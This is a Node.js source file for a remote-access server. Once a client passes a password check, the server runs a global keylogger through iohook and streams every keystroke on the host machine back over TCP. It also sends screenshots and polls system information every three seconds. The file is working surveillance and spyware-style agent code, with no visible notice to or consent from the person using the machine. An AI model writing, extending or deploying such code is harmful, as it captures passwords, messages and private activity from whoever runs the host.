const { EventEmitter } = require('events')
const { Packets, PacketParser } = require('./lib/Protocol')
const Connection = require('./lib/Connection')
const UUID = require('node-machine-id').machineIdSync()

class Server extends EventEmitter {
  constructor (password) {
    super()
    const self = this

    this._UDPport = 41234
    this._TCPport = 41233

    this.password = password
    this.__authAttemptInterval__ = 1 * 1000
    this.__maxAuthAttempts__ = 4

    // TODO: Client ID / Session generator
    this.clients = {
      /*
        {
          TCP: net.Socket
          UDP: (address, port)
        }
      */
    }
    this.clients_lookup = {}

    {
      const TCPserver = new Connection.TCP.Server()

      TCPserver.listen(this._TCPport, '0.0.0.0', function () {
        const address = this.address()
        console.log(`TCP server listening ${address.address}:${address.port}`)
      })

      TCPserver.on('connection', function (socket) {
        socket.__lastAuthenticationAttempt__ = 0
        socket.__authenticationAttemptCount__ = 0

        console.log('A new connection has been established.')

        socket.write(Packets.r_Hello.create({ status: null, id: UUID }))

        socket.on('payload', (...data) => {
          self._onPayload(...data, socket)
        })

        socket.on('end', function () {
          console.log('Closing connection with the client')
        })

        // Don't forget to catch error, for your own sake.
        socket.on('error', function (err) {
          console.log(err)
        })
      })

      this._TCPserver = TCPserver
    }

    {
      const UDPserver = new Connection.UDP.Server()

      UDPserver.on('listening', function () {
        const address = this.address()
        console.log(`UDP server listening ${address.address}:${address.port}`)
      })

      UDPserver.on('data', function (rinfo, data) {
        rinfo._isUDP = true

        self._onPayload(data, rinfo)
      })

      UDPserver.bind(this._UDPport, '0.0.0.0')
      this._UDPserver = UDPserver
    }

    this.on(Packets.KeylogSetup, function (packet, conn) {
      if (!packet.data) return

      if (!conn.keylog) {
        self.__iohookLib = require('iohook')
        conn.keylog = {
          buffer: [],
          intervalID: null,
          keyEvt: evt => {
            conn.keylog.buffer.push(evt.keychar)
          }
        }
      }

      function disableKeylog () {
        if (!conn.keylog) return

        clearInterval(conn.keylog.intervalID)
        conn.keylog.intervalID = null
        if (self.__iohookLib) {
          self.__iohookLib.off('keypress', conn.keylog.keyEvt)
        }
      }

      if (packet.data.interval === 0) {
        console.log('DISABLE')
        disableKeylog()
        return
      }

      if (conn.keylog.intervalID) clearInterval(conn.keylog.intervalID)

      self.__iohookLib.on('keypress', conn.keylog.keyEvt)
      self.__iohookLib.start()

      conn.keylog.intervalID = setInterval(function () {
        // Send loop
        if (conn.keylog.buffer.length !== 0) {
          conn.tcp.write(Packets.r_Keylog.create(conn.keylog.buffer))
          conn.keylog.buffer = []
        }
      }, packet.data.interval)

      conn.tcp.__destructors.keylog = disableKeylog.bind(conn)
    })

    const screenshot = require('./lib/Screenshot')
    this.on(Packets.Screenshot, async function (packet, conn) {
      let screenshotData = await screenshot.screenshot()
      conn.tcp.write(Packets.r_Screenshot.create(
        screenshotData
      ))
    })
  }

  _onPayload (payload, socket) {
    try {
      const rawPacket = JSON.parse(payload.toString())
      const packet = PacketParser(rawPacket)
      this._onPacket(packet, socket)
    } catch (e) {
      console.log('DROPPED: ', e)
      // If the parse fails, just drop the payload
    }
  }

  _onPacket (packet, socket) {
    // if (socket._isUDP) {
    //   console.debug('>RECV_UDP>', packet)
    // } else {
    //   console.debug('>RECV_TCP>', packet)
    // }

    let connectionPair = null

    if (socket._isUDP) {
      const address = `${socket.address}:${socket.port}`

      if (packet.constructor === Packets.Hello) {
        connectionPair = this.clients[packet.data] // id
        if (!connectionPair || !connectionPair.tcp) {
          console.warn("Didn't find id in known clients but received an auth")
          return
        }

        if (connectionPair.udp) console.warn('Already got Hello?')

        connectionPair.udp = {
          address: socket.address,
          port: socket.port
        }
        this.clients_lookup[address] = connectionPair

        const systemInformation = require('./lib/SystemInformation')
        Promise.all([
          systemInformation.getMetaInformation(),
          systemInformation.getDynamicInformation()
        ]).then(([metaData, dynamicData]) => {
          this._UDPserver.write(
            Packets.Poll.create({ ...metaData, ...dynamicData }),
            socket.address,
            socket.port
          )
        })

        setInterval(() => {
          systemInformation.getDynamicInformation().then(data => {
            this._UDPserver.write(
              Packets.Poll.create(data),
              socket.address,
              socket.port
            )
          })
        }, 3000)

        return
      }

      // assume that a connection from the address is correct?
      if (
        this.clients_lookup[address] &&
        this.clients_lookup[address].tcp.__userAuthenticated__
      ) {
        connectionPair = this.clients_lookup[address]
      }
    } else {
      // TCP
      if (packet.constructor === Packets.Hello) {
        if (socket.__userAuthenticated__ === true) {
          console.warn('Connection already authenticated...')
        } else {
          if (
            new Date() - socket.__lastAuthenticationAttempt__ <
            this.__authAttemptInterval__
          ) {
            return
          }

          const data = packet.data

          if (!data) return
          if (!data.id) return

          if (data.key === this.password) {
            socket.write(
              Packets.r_Hello.create({
                status: true,
                udp_port: this._UDPport
              })
            )
            socket.__userAuthenticated__ = true

            if (!socket.__destructors) {
              socket.__destructors = []
              socket.on('close', function () {
                Object.values(this.__destructors).forEach(f => f())
              })
            }

            if (this.clients[data.id]) {
              if (this.clients[data.id].tcp) {
                this.clients[data.id].tcp.destroy()
              }
            } else {
              this.clients[data.id] = {
                tcp: socket
              }
              socket.__connectionPair = this.clients[data.id]
            }
          } else {
            socket.write(
              Packets.r_Hello.create({
                status: false,
                attempts:
                  this.__maxAuthAttempts__ -
                  ++socket.__authenticationAttemptCount__
              })
            )
            socket.__lastAuthenticationAttempt__ = new Date()

            if (
              socket.__authenticationAttemptCount__ === this.__maxAuthAttempts__
            ) {
              console.log('BAD AUTH - LIMIT REACHED: KICK')
              socket.destroy()
            }
            return
          }
        }
      }

      if (socket.__userAuthenticated__) {
        connectionPair = socket.__connectionPair
      }
    }

    if (!connectionPair) {
      console.log('NOT AUTHENTICATED')
    }

    this.emit(packet.constructor, packet, connectionPair)
  }
}

module.exports = Server
